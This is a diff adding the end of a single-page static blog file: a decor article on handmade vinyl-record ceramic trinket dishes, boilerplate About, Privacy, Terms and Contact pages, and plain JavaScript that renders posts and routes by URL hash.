+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling Ideas for Handmade Record Dishes</h2>
+
+<p>Because these dishes are visually playful, they work best when styled with pieces that support their handmade, retro, or romantic personality. The surrounding items do not need to match perfectly, but they should feel connected through color, texture, or mood.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Pair with Plants for Softness</h3>
+
+<p>Greenery helps soften the bold black surface of the record dish. A small trailing plant, succulent, or leafy stem adds freshness and makes the setup feel more natural. The contrast between handmade ceramic and living greenery is especially appealing.</p>
+
+<p>This combination works beautifully on desks, shelves, vanities, and windowsills. It keeps the display from feeling too dark while adding a relaxed, creative mood.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add Jewelry for Shine</h3>
+
+<p>Gold rings, delicate chains, and small earrings look striking against a black record dish. The glossy background makes metallic items stand out. This is one reason vinyl trinket dishes are especially useful as ring dishes or jewelry holders.</p>
+
+<p>If gifting the dish, placing a small pair of earrings or a charm inside can make the presentation feel extra thoughtful.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Create a Retro-Inspired Shelf Display</h3>
+
+<p>For a music-themed shelf, combine the dish with a small speaker, vintage camera, framed lyric print, record sleeve, candle, or stack of books. The dish adds a playful detail without requiring a large amount of space.</p>
+
+<p>For a softer romantic display, pair the heart-shaped dish with pink accents, dried flowers, perfume bottles, or handwritten notes.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> When styling a small dish, leave some empty space around it. Tiny decorative objects can get lost if surrounded by clutter. A little breathing room helps the shape, shine, and design stand out.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Handmade Ceramic Pieces Feel Special</h2>
+
+<p>Handmade ceramics have a warmth that factory-perfect pieces often lack. Slight variations in shape, glaze, brushstrokes, and painted details make each item feel one of a kind. That uniqueness is part of the appeal.</p>
+
+<p>In these record dishes, the hand-drawn grooves mimic the texture of vinyl while still clearly showing the artist’s touch. The glossy finish gives the pieces polish, but the imperfect lines keep them playful and human.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Small-Batch Decor with Personality</h3>
+
+<p>Handmade trinket dishes fit perfectly into the growing appreciation for small-batch decor and meaningful objects. Instead of filling a home only with generic accessories, people are drawn to pieces that feel personal, artistic, and expressive.</p>
+
+<p>A vinyl record dish checks all those boxes. It is useful, but it also has a theme, a message, and a sense of humor. It can reflect someone’s love of music, romance, creativity, or retro style.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Appeal of Playful Functional Art</h3>
+
+<p>Functional art is especially satisfying because it does not sit untouched. It becomes part of daily life. A trinket dish can be used every morning and every evening, making it both decorative and practical.</p>
+
+<p>This is why small ceramic accessories make great gifts. They feel artistic, but they are not fragile in the sense of being only for display. They can be enjoyed every day.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Gift Ideas for Vinyl Record Trinket Dishes</h2>
+
+<p>A music-inspired trinket dish can be adapted for many occasions. Its combination of charm, function, and personality makes it easy to personalize with other small items.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Thoughtful Gift Pairings</h4>
+
+<ul>
+  <li><strong>For a partner:</strong> Pair the heart dish with a ring, bracelet, or love note.</li>
+  <li><strong>For a music lover:</strong> Add a playlist card, concert ticket, or record store gift card.</li>
+  <li><strong>For an artist:</strong> Pair it with paintbrushes, charms, beads, or creative supplies.</li>
+  <li><strong>For a friend:</strong> Add earrings, a candle, or a handwritten message.</li>
+  <li><strong>For a dorm room:</strong> Pair it with desk accessories, fairy lights, or a small plant.</li>
+</ul>
+
+<p>The dish itself is already meaningful, but a small added detail can make the gift feel curated. Presentation also matters. Wrap it in tissue paper, place it in a small box, and add a card that explains why the design made you think of the recipient.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> If the dish has a music-related phrase, build the gift around that message. For “Make Your Own Melody,” add something that supports creativity. For “All the feels,” add something sentimental or romantic.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Care Tips for Decorative Ceramic Trinket Dishes</h2>
+
+<p>Although trinket dishes are small, caring for them properly helps preserve the finish and design. Since pieces like these are often hand-painted or glazed, gentle handling is best.</p>
+
+<p>Use them for dry items such as jewelry, keys, coins, pins, or keepsakes. Avoid using them for food unless they are specifically labeled food-safe by the maker. If they collect dust, wipe them gently with a soft dry or lightly damp cloth.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Keep Them Away from Heavy Wear</h3>
+
+<p>A trinket dish can hold small items, but it should not be overloaded with heavy objects. Keys are fine, but dropping them repeatedly from a height could chip the surface. Place the dish somewhere stable and easy to access.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Protect the Glossy Finish</h3>
+
+<p>The glossy black finish is part of what makes the record design so striking. To keep it looking its best, avoid abrasive cleaners or rough scrubbing. A gentle wipe is usually enough for everyday care.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Use record trinket dishes for jewelry, keys, coins, pins, and small keepsakes.</li>
+    <li>Style them with plants, candles, art supplies, or vintage-inspired decor.</li>
+    <li>Choose the heart shape for romantic gifts and the round shape for classic music-themed styling.</li>
+    <li>Keep the surrounding area simple so the dish remains the focal point.</li>
+    <li>Clean gently to protect hand-painted details and glossy finishes.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Small Decor with Music, Meaning, and Personality</h2>
+
+<p>Vinyl record trinket dishes are a beautiful example of how small decor can carry a lot of personality. They combine the nostalgia of music, the practicality of a catchall dish, and the charm of handmade ceramic art. Whether shaped like a heart or a classic round record, each piece feels expressive and useful.</p>
+
+<p>These dishes are perfect for anyone who loves music, creative spaces, romantic details, or playful home accents. They can hold jewelry on a vanity, keys by the door, pins on a desk, or tiny keepsakes on a bedside table. At the same time, they add visual interest and tell a small story about the person who uses them.</p>
+
+<p>The best part is their versatility. They can feel sweet, retro, artistic, romantic, or whimsical depending on how they are styled. With a glossy black finish, handwritten labels, and charming phrases, these record-inspired dishes turn everyday organization into something more joyful. They are proof that even the smallest home accessories can make a room feel more personal, creative, and full of heart.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Vinyl Record Trinket Dish</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Ceramic Decor</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Music Lover Gift</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Jewelry Dish Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Retro Home Decor</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Heart Trinket Dish</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Creative Gift Ideas</span>
+</div>
+
+                `
+}
+        ];
+
+        // Static Legal Pages (Required for AdSense & Pinterest)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>My Awesome Blog</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At My Awesome Blog, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+                    
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+                    
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+                    
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io">contact@carolynadamsulo-creator.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Beautiful Home Decorating Edit";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // A placeholder avatar
+
+        // Function to render the home page (list of posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (like Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+
+            if (!page) {
+                app.innerHTML = `<p style="color: var(--text-color);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 30px; padding-bottom: 30px;">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Function to render a single post
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+
+            if (!post) {
+                app.innerHTML = `<p style="color: var(--text-color);">Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Simple router/navigator
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser back/forward buttons
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                // Check if the hash matches a static page, otherwise assume it's a post
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+
+</html>
